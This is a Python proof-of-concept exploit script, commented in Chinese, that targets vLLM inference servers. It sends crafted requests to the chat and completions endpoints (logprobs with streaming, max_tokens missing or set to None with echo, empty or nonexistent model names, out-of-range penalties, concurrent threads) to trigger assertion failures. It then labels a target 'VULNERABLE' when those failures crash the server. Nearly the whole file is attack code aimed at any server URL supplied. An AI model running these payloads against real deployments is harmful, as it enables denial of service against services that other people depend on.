#!/usr/bin/env python3
"""
vLLM Assert Vulnerability PoC
针对vLLM项目中assert语句的漏洞利用脚本

使用方法:
python vllm_assert_exploit.py [服务器URL]

默认服务器URL: http://localhost:8000
"""

import requests
import json
import threading
import time
import sys
import argparse
from typing import Dict, Any, Optional

class VLLMAssertExploit:
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'vLLM-Assert-Exploit/1.0'
        })
        
    def test_server_availability(self) -> bool:
        """测试服务器是否可用"""
        try:
            response = self.session.get(f"{self.base_url}/v1/models", timeout=5)
            return response.status_code == 200
        except Exception as e:
            print(f"[-] Server availability test failed: {e}")
            return False
    
    def exploit_logprobs_assert(self) -> bool:
        """
        利用logprobs assert漏洞
        目标: assert output.logprobs is not None, "Did not output logprobs"
        """
        print("[*] Testing logprobs assert vulnerability...")
        
        url = f"{self.base_url}/v1/chat/completions"
        
        # 构造触发assert的payload
        payload = {
            "model": "gpt-3.5-turbo",  # 使用常见模型名
            "messages": [
                {"role": "user", "content": "Hello, world!"}
            ],
            "logprobs": True,           # 启用logprobs
            "top_logprobs": 1,          # 设置top_logprobs
            "max_tokens": 10,
            "temperature": 0.0,
            "stream": False
        }
        
        try:
            response = self.session.post(url, json=payload, timeout=15)
            print(f"[+] Response status: {response.status_code}")
            
            if response.status_code == 500:
                print("[!] Potential assert failure detected!")
                response_text = response.text
                if "AssertionError" in response_text or "assert" in response_text.lower():
                    print("[!] CONFIRMED: AssertionError detected!")
                    print(f"[!] Response snippet: {response_text[:300]}...")
                    return True
                else:
                    print(f"[!] 500 error but no assert: {response_text[:200]}...")
            elif response.status_code == 200:
                print("[+] Request succeeded (no assert triggered)")
            else:
                print(f"[!] Unexpected status code: {response.status_code}")
                print(f"[!] Response: {response.text[:200]}...")
                
            return False
        except Exception as e:
            print(f"[-] Error during logprobs exploit: {e}")
            return False
    
    def exploit_streaming_logprobs_assert(self) -> bool:
        """
        利用流式响应中的logprobs assert漏洞
        """
        print("[*] Testing streaming logprobs assert vulnerability...")
        
        url = f"{self.base_url}/v1/chat/completions"
        
        payload = {
            "model": "gpt-3.5-turbo",
            "messages": [
                {"role": "user", "content": "Generate a detailed response about machine learning"}
            ],
            "logprobs": True,
            "top_logprobs": 5,          # 更高的值增加失败概率
            "stream": True,             # 启用流式响应
            "max_tokens": 100,
            "temperature": 0.1
        }
        
        try:
            response = self.session.post(url, json=payload, stream=True, timeout=20)
            print(f"[+] Streaming response status: {response.status_code}")
            
            if response.status_code != 200:
                print(f"[!] Non-200 status: {response.status_code}")
                print(f"[!] Response: {response.text[:200]}...")
                return False
            
            # 处理流式响应
            line_count = 0
            for line in response.iter_lines():
                if line:
                    line_str = line.decode('utf-8')
                    line_count += 1
                    
                    # 检查错误信息
                    if any(keyword in line_str.lower() for keyword in 
                           ["error", "assert", "exception", "traceback"]):
                        print(f"[!] Error detected in streaming response at line {line_count}!")
                        print(f"[!] Error line: {line_str}")
                        return True
                    
                    # 限制输出行数
                    if line_count > 50:
                        print("[+] Streaming test completed without errors")
                        break
                        
            return False
        except Exception as e:
            print(f"[-] Streaming error: {e}")
            return False
    
    def exploit_max_tokens_assert(self) -> bool:
        """
        利用max_tokens assert漏洞
        目标: assert request.max_tokens is not None
        """
        print("[*] Testing max_tokens assert vulnerability...")
        
        url = f"{self.base_url}/v1/completions"
        
        # 构造缺少max_tokens的请求
        payload = {
            "model": "gpt-3.5-turbo",
            "prompt": "Hello world, please respond",
            "echo": True,               # 启用echo模式触发assert路径
            "temperature": 0.0,
            # 故意不设置max_tokens或设为None
        }
        
        try:
            response = self.session.post(url, json=payload, timeout=15)
            print(f"[+] Response status: {response.status_code}")
            
            if response.status_code == 500:
                response_text = response.text
                if "AssertionError" in response_text or "max_tokens" in response_text:
                    print("[!] CONFIRMED: max_tokens assert failure!")
                    print(f"[!] Response: {response_text[:300]}...")
                    return True
                else:
                    print(f"[!] 500 error: {response_text[:200]}...")
            
            return False
        except Exception as e:
            print(f"[-] Error during max_tokens exploit: {e}")
            return False
    
    def exploit_max_tokens_none_assert(self) -> bool:
        """
        通过显式设置max_tokens为None触发assert
        """
        print("[*] Testing max_tokens None assert vulnerability...")
        
        url = f"{self.base_url}/v1/completions"
        
        payload = {
            "model": "gpt-3.5-turbo",
            "prompt": "Hello",
            "max_tokens": None,         # 显式设置为None
            "echo": True,
            "temperature": 0.0
        }
        
        try:
            response = self.session.post(url, json=payload, timeout=15)
            print(f"[+] Response status: {response.status_code}")
            
            if response.status_code == 500:
                response_text = response.text
                if "AssertionError" in response_text:
                    print("[!] CONFIRMED: max_tokens None assert failure!")
                    print(f"[!] Response: {response_text[:300]}...")
                    return True
                    
            return False
        except Exception as e:
            print(f"[-] Error during max_tokens None exploit: {e}")
            return False
    
    def exploit_combined_assert_attack(self) -> bool:
        """
        组合多个assert触发条件的攻击
        """
        print("[*] Testing combined assert vulnerability...")
        
        url = f"{self.base_url}/v1/chat/completions"
        
        # 构造复杂的恶意请求
        payload = {
            "model": "non-existent-model-12345",  # 不存在的模型
            "messages": [
                {"role": "user", "content": ""}   # 空内容
            ],
            "logprobs": True,
            "top_logprobs": 10,                   # 大数值
            "max_tokens": None,                   # None值
            "stream": True,
            "temperature": 0.0,
            "n": 2,                               # 多个选择
            "presence_penalty": 2.0,              # 超出范围的值
            "frequency_penalty": 2.0              # 超出范围的值
        }
        
        try:
            response = self.session.post(url, json=payload, stream=True, timeout=15)
            print(f"[+] Combined attack status: {response.status_code}")
            
            if response.status_code == 500:
                response_text = response.text
                if "AssertionError" in response_text:
                    print("[!] CONFIRMED: Combined assert failure!")
                    print(f"[!] Response: {response_text[:300]}...")
                    return True
                    
            return False
        except Exception as e:
            print(f"[-] Combined attack error: {e}")
            return False
    
    def exploit_concurrent_assert(self) -> bool:
        """
        并发攻击触发assert失败
        """
        print("[*] Testing concurrent assert vulnerability...")
        
        results = []
        
        def send_malicious_request(thread_id: int):
            url = f"{self.base_url}/v1/chat/completions"
            payload = {
                "model": "gpt-3.5-turbo",
                "messages": [
                    {"role": "user", "content": f"Thread {thread_id} test message"}
                ],
                "logprobs": True,
                "top_logprobs": 1,
                "max_tokens": 5,
                "stream": True,
                "temperature": 0.0
            }
            
            try:
                response = self.session.post(url, json=payload, stream=True, timeout=10)
                if response.status_code == 500:
                    results.append(f"Thread {thread_id}: 500 error")
                    if "AssertionError" in response.text:
                        results.append(f"Thread {thread_id}: ASSERT FAILURE!")
                elif response.status_code != 200:
                    results.append(f"Thread {thread_id}: Status {response.status_code}")
            except Exception as e:
                results.append(f"Thread {thread_id}: Exception {str(e)[:100]}")
        
        # 创建多个线程同时发送请求
        threads = []
        for i in range(5):
            t = threading.Thread(target=send_malicious_request, args=(i,))
            threads.append(t)
            t.start()
        
        # 等待所有线程完成
        for t in threads:
            t.join()
        
        # 分析结果
        if results:
            print("[!] Concurrent test results:")
            for result in results:
                print(f"    {result}")
            return any("ASSERT FAILURE" in result for result in results)
        else:
            print("[+] All concurrent requests completed successfully")
            return False
    
    def exploit_final_res_assert(self) -> bool:
        """
        尝试触发final_res相关的assert
        """
        print("[*] Testing final_res assert vulnerability...")
        
        url = f"{self.base_url}/v1/chat/completions"
        
        # 构造可能导致final_res为None的请求
        payload = {
            "model": "",                          # 空模型名
            "messages": [
                {"role": "user", "content": "test"}
            ],
            "max_tokens": 1,
            "timeout": 0.001,                     # 极短超时
            "temperature": 0.0
        }
        
        try:
            response = self.session.post(url, json=payload, timeout=5)
            print(f"[+] final_res test status: {response.status_code}")
            
            if response.status_code == 500:
                response_text = response.text
                if "AssertionError" in response_text and "final_res" in response_text:
                    print("[!] CONFIRMED: final_res assert failure!")
                    print(f"[!] Response: {response_text[:300]}...")
                    return True
                    
            return False
        except Exception as e:
            print(f"[-] final_res test error: {e}")
            return False
    
    def run_all_exploits(self) -> Dict[str, bool]:
        """
        运行所有漏洞利用测试
        """
        print("=" * 60)
        print("vLLM Assert Vulnerability PoC")
        print("=" * 60)
        print(f"Target: {self.base_url}")
        print()
        
        # 检查服务器可用性
        if not self.test_server_availability():
            print("[-] Server not available, aborting tests")
            return {}
        
        print("[+] Server is available, starting exploit tests...")
        print()
        
        # 运行各种攻击测试
        results = {}
        
        tests = [
            ("logprobs_assert", self.exploit_logprobs_assert),
            ("streaming_logprobs_assert", self.exploit_streaming_logprobs_assert),
            ("max_tokens_assert", self.exploit_max_tokens_assert),
            ("max_tokens_none_assert", self.exploit_max_tokens_none_assert),
            ("combined_assert_attack", self.exploit_combined_assert_attack),
            ("final_res_assert", self.exploit_final_res_assert),
            ("concurrent_assert", self.exploit_concurrent_assert),
        ]
        
        for test_name, test_func in tests:
            print(f"\n{'='*40}")
            try:
                result = test_func()
                results[test_name] = result
                if result:
                    print(f"[!] {test_name}: VULNERABLE!")
                else:
                    print(f"[+] {test_name}: Not vulnerable")
            except Exception as e:
                print(f"[-] {test_name}: Test failed with error: {e}")
                results[test_name] = False
            
            # 短暂延迟避免过于频繁的请求
            time.sleep(0.5)
        
        print(f"\n{'='*60}")
        print("SUMMARY:")
        print(f"{'='*60}")
        
        vulnerable_count = sum(results.values())
        total_tests = len(results)
        
        for test_name, is_vulnerable in results.items():
            status = "VULNERABLE" if is_vulnerable else "Safe"
            print(f"{test_name:30} : {status}")
        
        print(f"\nTotal: {vulnerable_count}/{total_tests} tests found vulnerabilities")
        
        if vulnerable_count > 0:
            print("\n[!] WARNING: Server appears to be vulnerable to assert-based attacks!")
            print("[!] These vulnerabilities can lead to service disruption.")
        else:
            print("\n[+] Server appears to be protected against these assert vulnerabilities.")
        
        return results

def main():
    parser = argparse.ArgumentParser(description='vLLM Assert Vulnerability PoC')
    parser.add_argument('url', nargs='?', default='http://localhost:8000',
                        help='Target vLLM server URL (default: http://localhost:8000)')
    parser.add_argument('--timeout', type=int, default=15,
                        help='Request timeout in seconds (default: 15)')
    parser.add_argument('--verbose', '-v', action='store_true',
                        help='Enable verbose output')
    
    args = parser.parse_args()
    
    # 创建exploit实例
    exploit = VLLMAssertExploit(args.url)
    
    # 设置超时
    exploit.session.timeout = args.timeout
    
    # 运行所有测试
    results = exploit.run_all_exploits()
    
    # 返回适当的退出码
    if any(results.values()):
        sys.exit(1)  # 发现漏洞
    else:
        sys.exit(0)  # 未发现漏洞

if __name__ == "__main__":
    main()